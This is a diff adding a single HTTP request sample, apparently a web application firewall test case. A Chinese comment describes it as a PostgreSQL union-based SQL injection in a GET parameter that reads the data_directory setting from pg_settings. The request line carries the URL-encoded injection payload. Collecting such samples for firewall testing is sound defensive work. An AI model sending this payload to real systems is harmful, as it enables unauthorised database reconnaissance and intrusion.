@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506358
+# 攻击者基于union查询，将"union select setting from pg_settings where name='data_directory' "语句注入到 SQL 查询参数中，从系统表pg_settings中查询数据库安装目录信息。
+GET /?id=1%20union%20select%20setting%20from%20pg_settings%20where%20name=%27data_directory%27%20&bid=hd_tag_m8mv23yf HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23yf
+RM-PRO-Token: c6dfc9102951f5251f4afd98a7f5b643
+RM-PRO-Time: 1742808352775
+User-Agent: curl/7.83.1
+
